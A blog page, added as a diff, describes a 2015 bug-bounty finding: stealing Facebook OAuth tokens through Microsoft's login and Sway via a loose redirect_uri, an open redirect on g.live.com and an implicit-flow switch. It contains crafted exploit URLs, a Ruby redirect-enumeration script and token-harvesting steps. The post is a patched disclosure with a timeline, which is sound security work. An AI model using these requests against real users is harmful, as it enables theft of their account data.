@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stealing OAuth tokens in Microsoft Sway application &mdash; r0rshark Blog</title>
+    <link href="https://fonts.googleapis.com/css?family=Droid+Sans:400,700" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="/css/main.css">
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="apple-touch-icon" href="/images/logo.jpg"/>
+    <link href="/feed.xml" rel="alternate" type="application/rss+xml" title="r0rshark Blog" />
+    <meta name="title" content="Stealing OAuth tokens in Microsoft Sway application ">
+    <link rel="canonical" href="https://r0rshark.github.io/2015/09/06/microsoft/">
+    
+    <link rel="author" href="https://plus.google.com/110104859248839601734">
+    <meta property="og:title" content="Stealing OAuth tokens in Microsoft Sway application "/>
+    <meta property="og:url" content="https://r0rshark.github.io/2015/09/06/microsoft/"/>
+    
+    <meta property="og:image" content="https://r0rshark.github.io/images/microsoft/microsoft.jpg"/>
+    
+    <meta property="og:image" content="https://r0rshark.github.io/images/logo.jpg"/>
+    
+    
+    <meta property="og:description" content="Wide redirect_uri parameter in the OAuth process allows attacker to leak the Facebook OAuth token and steal user private information "/>
+    <meta name="description" content="Wide redirect_uri parameter in the OAuth process allows attacker to leak the Facebook OAuth token and steal user private information "/>
+    
+    <meta property="og:site_name" content="r0rshark Blog">
+</head>
+<body>
+
+<section class="site-nav">
+    <header>
+        <nav id="navigation">
+        <!--  <a class="brand" href="/">
+                <img src="/images/logo.jpg" alt="Inc">
+            </a>-->
+            <a href="/" class="home">Home</a>
+            <a href="https://it.linkedin.com/in/r0rshark">About Me</a>
+
+    </header>
+</section>
+
+
+<div class="article-cover">
+    <div>
+        <img src="/images/microsoft/microsoft.jpg" class="image">
+    </div>
+</div>
+
+<article>
+
+    <div class="container">
+        <header>
+            <div class="meta">
+                By <address><a rel="author" href="" title="Lorenzo Fontana" target="_blank">Lorenzo Fontana</a></address> &mdash;
+                <time pubdate datetime="2015-06-September" title="September 06, 2015">September 06, 2015</time>
+            </div>
+            <h1 class="title">Stealing OAuth tokens in Microsoft Sway application</h1>
+            <h2 class="subtitle"></h2>
+        </header>
+
+        <section>
+            <h3 id="tldr">TL;DR</h3>
+<p>The Connect with Facebook functionality of Microsoft is vulnerable to the OAuth token stealing attack.
+The <code>redirect_uri</code> parameter can be modified by the attacker making the Facebook OAuth token leak to a domain not controlled by Microsoft and in this way steal user private information accessible through the token.</p>
+
+<h3 id="oauth-guide">OAUTH GUIDE</h3>
+
+<p>A basic undestanding of the OAuth flow is useful to better understand this post, a very good guide can be found <a href="https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2">here</a>. When reading the guide focus the attention on “Grant Type: Authorization Code” and the “Grant Type: Implicit” which are by far the most common approaches.</p>
+
+<h3 id="probing-for-wide-redirecturi">PROBING FOR WIDE REDIRECT_URI</h3>
+<p>The <code>redirect_uri</code> parameter is very important because it represents the url to which the authorization_code/access_token (based on Grant Type) is sent. If we are able to change the value of the <code>redirect_uri</code> and not to make the OAuth flow to fail (because of authenticity checks on the <code>redirect_uri</code>) we could leak the token/code to a domain controlled by us.
+Original request:</p>
+
+<p><code>https://www.facebook.com/v2.0/dialog/oauth?client_id=441348565910475</code><br />
+<code>&amp;redirect_uri=</code><strong>https://profile.live.com/cid-847183e5db31faa2/services</strong><br />
+<code>&amp;scope=user_photos</code></p>
+
+<p>Possible redirect_url:</p>
+
+<ul>
+  <li><strong>Completely different domain</strong>:  redirect_uri=<code>https://attacker.com</code>;</li>
+  <li><strong>Different subdomain</strong>: redirect_uri=https://<code>xxx.live.com</code>/cid-847183e5db31faa2/services;</li>
+  <li><strong>Different folder</strong>: redirect_uri= https://profile.live.com<code>/xxx</code>;</li>
+</ul>
+
+<p>The use of a completely different domain is very unlikely to work while in some cases the use of a different folder or subdomain is allowed. Our current payload is:</p>
+
+<p><code>https://www.facebook.com/v2.0/dialog/oauth?client_id=441348565910475</code><br />
+<code>&amp;redirect_uri=</code><strong>https://xxx.live.com/xxx</strong><br />
+<code>&amp;scope=user_photos</code></p>
+
+<h3 id="searching-for-open-redirect">SEARCHING FOR OPEN REDIRECT</h3>
+<p>The ability to leak the the token/code to a different subdomain/folder is not useful per se, however it will provide to the attacker <strong>a wider attack surface</strong> to find an Open Redirect. An Open Redirect endpoint is a url which redirects the user to a parameter value without any validation. The idea is to <strong>find an Open Redirect in *.live.com/*</strong> which would leak the token to a domain that we can control.</p>
+
+<p>After some google dorking I have noticed that the endpoint:
+  <code>g.live.com/0HE_TRACKSTAR_ENUS9/\&lt;number\&gt;</code> issues a 302 Redirect to external domains based on  <code>\&lt;number\&gt;</code>.<br />
+For example <code>g.live.com/0HE_TRACKSTAR_ENUS9/1</code><br />
+redirects to <code>http://www.msn.com/it-it/</code><br />
+Through a 30 line of ruby script I have enumerated the possible domains to which I could leak the token</p>
+
+<div class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s2">&quot;net/http&quot;</span>
+<span class="nb">require</span> <span class="s2">&quot;uri&quot;</span>
+<span class="nb">require</span> <span class="s1">&#39;cgi&#39;</span>
+
+<span class="k">if</span> <span class="no">ARGV</span><span class="o">.</span><span class="n">length</span> <span class="o">&lt;</span> <span class="mi">4</span>
+  <span class="nb">puts</span> <span class="s2">&quot;url_brute.rb &lt;url to bruteforce&gt; &lt;start number&gt; &lt;end number&gt; &lt;file where to write&gt;&quot;</span>
+  <span class="nb">exit</span>
+<span class="k">end</span>
+
+<span class="n">base_url</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
+<span class="n">start</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span>
+<span class="n">ending</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span>
+<span class="n">file_path</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">3</span><span class="o">]</span>
+
+<span class="n">uri</span> <span class="o">=</span> <span class="no">URI</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">base_url</span><span class="p">)</span>
+<span class="n">http</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">uri</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="n">uri</span><span class="o">.</span><span class="n">port</span><span class="p">)</span>
+<span class="n">file</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span>
+
+<span class="n">start</span><span class="o">.</span><span class="n">upto</span><span class="p">(</span><span class="n">ending</span><span class="p">){</span><span class="o">|</span><span class="nb">id</span><span class="o">|</span>
+  <span class="n">uri</span> <span class="o">=</span> <span class="no">URI</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">base_url</span><span class="o">+</span><span class="nb">id</span><span class="o">.</span><span class="n">to_s</span><span class="p">)</span>
+  <span class="n">request</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">::</span><span class="no">Get</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">uri</span><span class="o">.</span><span class="n">request_uri</span><span class="p">)</span>
+  <span class="k">begin</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+    <span class="n">found_url</span> <span class="o">=</span> <span class="n">response</span><span class="o">[</span><span class="s2">&quot;Location&quot;</span><span class="o">].</span><span class="n">to_s</span>
+  <span class="k">rescue</span>
+    <span class="n">found_url</span> <span class="o">=</span> <span class="nb">id</span><span class="o">.</span><span class="n">to_s</span><span class="o">+</span> <span class="s2">&quot; Timeout&quot;</span>
+    <span class="k">next</span>
+  <span class="k">end</span>
+  <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">id</span><span class="o">.</span><span class="n">to_s</span><span class="o">+</span> <span class="s2">&quot; &quot;</span><span class="o">+</span><span class="n">found_url</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+  <span class="nb">puts</span> <span class="nb">id</span><span class="o">.</span><span class="n">to_s</span><span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="n">found_url</span>
+
+<span class="p">}</span>
+<span class="n">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
+
+<p>Among these domains there are some which can be purchased like g.live.com/0HE_TRACKSTAR_CSCZ9/75011 which redirects to http://staysafe.org/.
+Making the  user issue a GET request to <code>https://www.facebook.com/v2.0/dialog/oauth?redirect_uri=http://g.live.com/0HE_TRACKSTAR_CSCZ9/75011&amp;display=popup</code><br />
+<code>&amp;scope=user_photos+user_videos&amp;client_id=441348565910475&amp;ret=login</code> will leak the token/code to http://staysafe.org/.</p>
+
+<h3 id="changing-the-flow">CHANGING THE FLOW</h3>
+<p>Referencing to the guide that I have pointed out before the <code>Grant Type</code> used by Microsoft is the <code>Authorization Code</code> one. Using the exploit we can leak the <code>Authorization Code</code> but in order to access the protected information we need to exchange the <code>Authorization code</code> with the <code>Access Token</code>. However in order to do this we need to know the <code>client secret</code> which we aren’t able to get since it is stored on the Microsoft servers. In order to bypass this limitation we can change <code>Grant Type</code> to the Implicit one which directly provides the <code>Access Token</code> to the url in the redirect_url field.
+With the Facebook SDK this can be done by <strong>adding the parameter response_type=token</strong>.</p>
+
+<h3 id="stealing-the-token">STEALING THE TOKEN</h3>
+<p>An attaker could:</p>
+
+<ol>
+  <li>Purchased the domain <code>http://staysafe.org/</code>;</li>
+  <li>Insert a small javascript script at staysafe.org to get the window.location.hash and parse it to <code>extract the token</code>;</li>
+  <li>Make the victim issue a GET request to <code>https://www.facebook.com/v2.0/dialog/oauth?redirect_uri=http://g.live.com/0HE_TRACKSTAR_CSCZ9/75011&amp;display=popup</code><br />
+<code>&amp;scope=user_photos+user_videos&amp;client_id=441348565910475&amp;ret=login&amp;response_type=token</code>.</li>
+</ol>
+
+<h3 id="trigger-the-exploit-without-interaction">TRIGGER THE EXPLOIT WITHOUT INTERACTION</h3>
+<p>The Connect with Facebook functionality can be used in the Microsoft Sway application where I found a second vulnerability which would allow an attaker to make the user issue arbitrary GET requests by just viewing a “sway”.
+This is possible because, crafting a particular request in the Add image functionality, an attacker is able to persistently control the src attribute of an img tag. I tried to exploit this kind of vulnerability to get an XSS however the quotes were escaped and the <code>javascript:alert(1)</code> payload in the img src attribute doesn’t work in the modern browsers. However we can use this vulnerability to automatically make the user issue our “exploit GET request” triggering our exploit as soon as he view a maliciously crafted “sway”.</p>
+
+<div class="full zoomable">
+  <img src="/images/microsoft/sway_poc.png" />
+</div>
+
+<ul>
+  <li>15 May 2015 Vulnerability reported to the Microsoft Security Team</li>
+  <li>4 August 2015 Vulnerability patched</li>
+  <li>25 August 2015 Got reward of $1000</li>
+</ul>
+
+
+            
+<div class="social">
+    
+    <div class="fb-share-button" data-href="https://r0rshark.github.io/2015/09/06/microsoft" data-layout="button_count"></div>
+    
+    
+    <div>
+        <a href="https://twitter.com/share" class="twitter-share-button">Tweet</a>
+    </div>
+    
+    
+      <script type="text/javascript" src="//www.redditstatic.com/button/button1.js"></script>
+    
+
+
+    
+    <div>
+        <a href="http://news.ycombinator.com/submit" class="hn-share-button">Vote on HN</a>
+    </div>
+    
+</div>
+
+
+        </section>
+
+        <footer>
+            <address>
+               <img src="/images/me.png">
+                <p>Written by <strong><a rel="author" href="https://twitter.com/r0rshark" title="" target="_blank">Lorenzo Fontana</a></strong><br>
+                <span class="muted">Bug hunter and student at Polimi</span>
+                </p>
+            </address>
+
+        </footer>
+
+        
+        <section>
+            <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'r0rshark'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+
+        </section>
+        
+    </div>
+</article>
+
+
+<footer class="site-footer">
+    <div class="container">
+        &copy; 2015
+
+        <nav>
+            <a href="https://r0rshark.github.io">r0rshark Blog</a> &middot;
+            <a href="https://it.linkedin.com/in/r0rshark">About Me</a>
+        </nav>
+
+        <nav class="social">
+            
+            <a href="https://twitter.com/r0rshark" title="Follow on Twitter" target="_blank"><i class="icon icon-twitter black"></i></a>
+            
+            
+            <a href="/feed.xml" title="RSS Feed">
+                <i class="icon icon-rss black"></i>
+            </a>
+        </nav>
+        <p>Incorporated theme by <a href="https://sendtoinc.com">Inc</a></p>
+    </div>
+</footer>
+
+<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+<script src="/javascripts/main.js"></script>
+
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+
+<script>
+    (function(d, t) {
+        var g = d.createElement(t),
+            s = d.getElementsByTagName(t)[0];
+        g.src = '//hnbutton.appspot.com/static/hn.min.js';
+        s.parentNode.insertBefore(g, s);
+    }(document, 'script'));
+</script>
+
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/it_IT/sdk.js#xfbml=1&version=v2.3&appId=558852617585267";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+</body>
+</html>
